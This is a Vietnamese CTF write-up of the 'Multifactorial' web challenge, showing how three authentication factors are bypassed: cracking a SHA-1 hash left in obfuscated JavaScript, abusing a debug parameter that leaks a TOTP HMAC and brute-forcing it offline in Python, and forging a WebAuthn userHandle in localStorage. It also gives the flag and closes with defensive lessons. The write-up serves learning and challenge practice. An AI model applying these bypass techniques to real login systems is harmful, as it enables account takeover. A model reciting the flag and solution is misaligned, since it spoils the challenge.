---
layout: single
title: "Multifactorial - Advent of CTF 2025"
categories: ctf
tags: [web, mfa, idor, webauthn, totp]
date: 2026-01-04
permalink: /writeups/advent-of-ctf/multifactorial/
---

> [!NOTE]
> **Challenge Information**
> - **Event:** Advent of CTF 2025
> - **Challenge Name:** Multifactorial
> - **Category:** Web Exploitation
> - **Points:** 190
> - **Solves:** 147
> - **Author:** thee2d

## Mục Tiêu Thử Thách

**Nhiệm vụ:** Mạo danh người dùng `santa` để xâm nhập vào hệ thống SOC (Security Operations Center).

Hệ thống bảo mật được thiết kế với 3 lớp xác thực (MFA) theo mô hình chuẩn:
1.  **Something you know:** Mật khẩu (Password).
2.  **Something you have:** Mã xác thực dùng một lần (TOTP).
3.  **Something you are:** Chìa khóa bảo mật (WebAuthn/Passkey).

Hãy cùng phân tích và bẻ khóa từng lớp bảo mật này.

<!-- more -->

---

## Giai đoạn 1: Something You Know (Mật khẩu)

### Phân tích

Bước đầu tiên là vượt qua lớp bảo mật mật khẩu. Khi kiểm tra mã nguồn (View Source) của trang đăng nhập, ta phát hiện một đoạn mã JavaScript bị làm mờ (obfuscated).

Jingle McSnark đã để lại một "Easter Egg" ngay trong đám mã hỗn loạn đó. Dưới đây là đoạn code thú vị tìm được:

```javascript
var _0x148159=['...','You\x27re\x20really\x20lucky!\x20Here\x27s\x20my\x20hash\x20as\x20a\x20reward.\x20bf33632dd9668787878890cb4fbb54261b6b7571',...];
// ...
Math[_0x2f6642(0x1e2)]()===0x0 && alert(_0x2f6642(0x1df));
```

![Obfuscated JavaScript Code](/assets/images/multifactorial-stage1.png)

Đoạn mã trên có nghĩa là: Nếu bạn cực kỳ may mắn (khi `Math.random() === 0`), trình duyệt sẽ hiện thông báo chứa mã băm (hash) này. Nhưng chúng ta không cần chờ vận may, chúng ta có thể đọc nó trực tiếp từ source code!

> *"You're really lucky! Here's my hash as a reward. bf33632dd9668787878890cb4fbb54261b6b7571"*

### Khai thác

Chúng ta có một chuỗi hash: `bf33632dd9668787878890cb4fbb54261b6b7571`.
- **Độ dài:** 40 ký tự hexadecimal.
- **Nhận định:** Khả năng cao đây là **SHA-1**.
![CrackStation Result](/assets/images/multifactorial-crackstation.png)
Sử dụng các công cụ tra cứu bảng cầu vồng trực tuyến (như CrackStation) hoặc tấn công brute-force cục bộ (nếu cần), ta nhanh chóng tìm ra giá trị gốc.
**Kết quả:** Mật khẩu là `northpole`.

---

## Giai đoạn 2: Khai thác lỗ hổng thông tin trong quá trình xác thực TOTP

Khi đến giai đoạn thứ hai, tôi gặp phải lời nhắc nhập mật khẩu một lần dựa trên thời gian (TOTP). Tôi đã xem lại mã nguồn để tìm bất kỳ thông tin bí mật được chia sẻ hoặc dữ liệu cấu hình nào. Tôi đã xác định được một hằng số có tên là `ORACLE_KEY`.

```html
<script>
      const ORACLE_KEY = "17_w0Uld_83_V3Ry_fUNnY_1f_y0U_7H0u9H7_7H15_W45_4_Fl49";
// .... SNIP ....
</script>
```

Sau đó, tôi đã ghi lại yêu cầu xác thực trong Burp Suite để phân tích các tham số.

```http
POST /api/something-you-have-verify?debug=0 HTTP/2
Host: multifactorial.csd.lol
Cookie: connect.sid=s%3ARE8-34nlSF-O1UTrcaBuhEPuCS6QFZqy.KgRbsj1YH7tL2JElijO66u%2BQm3AYv3lRwYhWeAAyaW0
Content-Length: 17
Origin: https://multifactorial.csd.lol
Referer: https://multifactorial.csd.lol/something-you-have
.... SNIP ....

{
    "code":"123456"
}
```

Tôi đã ghi nhận tham số `debug=0` trong URL. Tôi đã sửa đổi nó thành `debug=1` để kiểm tra báo cáo lỗi chi tiết. Điều này đã phát hiện ra lỗ hổng rò rỉ thông tin, trong đó máy chủ trả về HMAC của mã TOTP dự kiến.

```http
HTTP/2 401 Unauthorized
Date: Mon, 22 Dec 2025 14:49:49 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 128
.... SNIP ....

{
    "error":"Invalid TOTP code.",
    "hmac":"575ab00150cb1ab22814ddeb37c6fe22cbeb17c21e9e59c098f26122a21bd6bd",
    "serverTime":1766414989
}
```

Với thông tin `ORACLE_KEY` và mã HMAC bị rò rỉ, tôi đã có thể thực hiện một cuộc tấn công vét cạn ngoại tuyến vào không gian TOTP 6 chữ số. Tôi đã triển khai đoạn mã sau để tìm ra mã chính xác.

#### a. Cơ chế "Anti-Replay" và "Rate Limiting"
Hệ thống không chỉ kiểm tra tính đúng sai của mã mà còn quản lý trạng thái phiên làm việc:
-   **Anti-Replay:** Mỗi lần bạn nhập sai, server sẽ coi như mã OTP hiện tại (hoặc chu kỳ hiện tại) đã bị "bẩn" (invalidated).
-   **New HMAC Generation:** Ngay khi nhập sai, server trả về một `hmac` mới và `serverTime` mới. Nếu bạn cố gắng sử dụng lại thông tin cũ hoặc mã giải được từ giây trước, request sẽ bị từ chối ngay lập tức.

#### b. Sự khắt khe của "Window Size" (Cửa sổ thời gian)
Trong các triển khai TOTP thực tế (như Google Authenticator), server thường cho phép độ lệch ("Drift") khoảng ±1 chu kỳ (tổng cộng 90 giây) để bù trừ đỗ trễ mạng hoặc lệch đồng hồ.
Nhưng tại trạm an ninh Bắc Cực này:
-   **Strict Timing:** Độ lệch cho phép bằng **0**. Mã chỉ hợp lệ duy nhất trong cửa sổ 30 giây hiện tại.
-   **Server-side Time:** Thuật toán tính toán dựa hoàn toàn trên `serverTime`. Nếu đồng hồ máy tính của bạn lệch dù chỉ vài giây so với server, mã tạo ra sẽ vô hiệu.

### 2. Chiến Thuật Khai Thác: "Racing Against Time"

Brute-force trực tiếp (Online) là vô vọng do Rate Limiting. Chiến thuật duy nhất khả thi là **Brute-force Offline** kết hợp với thao tác tay cực nhanh (hoặc tự động hóa hoàn toàn).

**Quy trình tấn công:**
1.  **Recon:** Gửi một request sai để kích hoạt phản hồi chứa `hmac` và `serverTime`.
2.  **Offline Cracking:** Sử dụng script Python để tính toán lại mã TOTP từ không gian mẫu `000000-999999` sao cho khớp với `hmac` vừa nhận được.
3.  **Submission:** Gửi mã tìm được lên server ngay lập tức.

**Tại sao Burp Suite là "Vũ khí tối thượng"?**
Trong kịch bản này, độ trễ (latency) là kẻ thù. Dùng trình duyệt web thông thường sẽ quá chậm do phải tải UI, xử lý JavaScript và render.
-   **Burp Repeater:** Cho phép gửi request HTTP thô (Raw HTTP) ngay lập tức khi có mã.
-   **Burp Intruder:** Nếu cần, có thể cấu hình để tự động hóa việc gửi payload, giảm thiểu thời gian thao tác xuống mili-giây.

**Script giải mã Offline (Python):**

```python
import hashlib
import hmac

# Khóa bí mật bị rò rỉ từ Client-side
secret = b"17_w0Uld_83_V3Ry_fUNnY_1f_y0U_7H0u9H7_7H15_W45_4_Fl49"

# HMAC nhận được từ phản hồi của server (thay đổi mỗi lần request)
target_hmac = "..." 

print(f"[*] Cracking TOTP for HMAC: {target_hmac}")

# Vét cạn không gian mẫu 6 chữ số (000000 - 999999)
for i in range(1000000):
    code = f"{i:06d}"
    # Tính toán lại HMAC với thuật toán SHA-256 (dựa trên phân tích)
    calculated_hmac = hmac.new(secret, code.encode(), hashlib.sha256).hexdigest()
    
    if calculated_hmac == target_hmac:
        print(f"[+] FOUND VALID TOTP: {code}")
        break
```

![Debug Response in Burp Suite](/assets/images/3.png)

**Kết quả:** Với sự hỗ trợ của Burp Suite và script Python tối ưu, ta tìm được mã TOTP đúng và vượt qua lớp bảo mật thứ hai.

---

## Giai đoạn 3: Giả mạo danh tính WebAuthn

Yếu tố thứ ba liên quan đến WebAuthn (Passkey). Để bắt đầu, tôi kiểm tra mã JavaScript phía máy khách để tìm hiểu cách thức hệ thống xử lý phản hồi xác thực.

```javascript
// ... (mã JS trích xuất từ trang web)
const payload = {
  name,
  id: cred.id,
  rawId: bufToB64url(cred.rawId),
  type: cred.type,
  response: {
    clientDataJSON: bufToB64url(cred.response.clientDataJSON),
    attestationObject: bufToB64url(cred.response.attestationObject),
  },
};

// Store helpful bits for login  <--- VULNERABILITY
localStorage.setItem("np_name", name);
localStorage.setItem("np_credId", verData.credId);
localStorage.setItem("np_userHandle", verData.userHandle);
```

Tôi nhận thấy một lỗ hổng nghiêm trọng: ứng dụng tin tưởng hoàn toàn vào dữ liệu trong `localStorage` để định danh người dùng trong bước đăng nhập cuối cùng. Nếu tôi có thể tạo ra một mã `userHandle` hợp lệ cho tài khoản quản trị `santa`, tôi hoàn toàn có thể mạo danh họ mà không cần khóa bảo mật thực sự của họ.

### Phân tích thuật toán User Handle
Tôi sử dụng tính năng **Virtual Authenticator** trong Chrome DevTools để hỗ trợ kiểm thử WebAuthn mà không cần thiết bị vật lý.

![Stage 3: Something You Are Registration](/assets/images/multifactorial-webauthn-helper.png)

Đầu tiên, tôi đăng ký một tài khoản phụ tên là `helper` để quan sát cấu trúc dữ liệu được lưu lại:
- **Internal ID (userHandle):** `6B07Dp2C_qr19uVb3_JHMQ`

![LocalStorage Helper Data](/assets/images/multifactorial-localstorage-helper.png)

Tôi đưa ra giả thuyết rằng `userHandle` này được tạo ra từ tên người dùng bằng cách sử dụng SHA-256, rút gọn xuống 16 byte và mã hóa Base64URL. Để kiểm chứng, tôi viết một script Python nhỏ để tính toán giá trị này cho `santa`.

```python
import hashlib
import base64

name = "santa"
digest = hashlib.sha256(name.encode()).digest()[:16]
santa_userHandle = base64.urlsafe_b64encode(digest).decode().rstrip("=")

print(santa_userHandle)
# Kết quả: ttyQg9o3L-0hGazhGum6hw
```

### Khai thác (Impersonation)
Sau khi có mã băm định danh của Santa, tôi chỉnh sửa các giá trị trong `localStorage` trên trình duyệt để khớp với tài khoản mục tiêu.

![LocalStorage Santa Updated](/assets/images/multifactorial-localstorage-santa.png)

Cuối cùng, tôi thực hiện đăng nhập. Máy chủ chấp nhận danh tính giả mạo từ trình duyệt và cho phép tôi truy cập vào bảng điều khiển quản trị tại `/admin`, nơi hiển thị mã flag cuối cùng.


---

## Kết Luận & Flag

Thử thách **Multifactorial** là một ví dụ điển hình cho nguyên tắc: **"Hệ thống bảo mật chỉ mạnh bằng mắt xích yếu nhất."**

- Dù sử dụng công nghệ tiên tiến như WebAuthn, việc thiếu kiểm soát dữ liệu đầu vào từ Client (Client-Side Trust) đã phá vỡ hoàn toàn tính toàn vẹn của hệ thống.
- Các lỗi sơ đẳng như rò rỉ khóa bí mật (Secret Key Leakage) và sử dụng thuật toán băm yếu (SHA-1) đóng vai trò đòn bẩy giúp kẻ tấn công leo thang dễ dàng.

> [!SUCCESS]
> **Flag:** `csd{1_L34rn3D_7h15_Fr0m_70m_5C077_84CK_1n_2020}`

---

## Bài Học Rút Ra

1.  **Không bao giờ tin tưởng Client:** Mọi dữ liệu định danh (như User ID trong WebAuthn) phải được kiểm soát chặt chẽ bởi Server (Session), không được phép nhận từ Client.
2.  **Quản lý khóa bí mật:** Không bao giờ hardcode khóa bí mật (Secret Keys) trong mã nguồn Frontend.
3.  **Tránh thuật toán cũ:** SHA-1 đã bị coi là không an toàn, hãy sử dụng SHA-256 hoặc mạnh hơn cho việc lưu trữ mật khẩu (kết hợp với Salt).

<div style="text-align: center; margin-top: 2rem;">
  <em>Chúc các bạn học tập tốt và hẹn gặp lại ở các thử thách sau!</em>
</div>
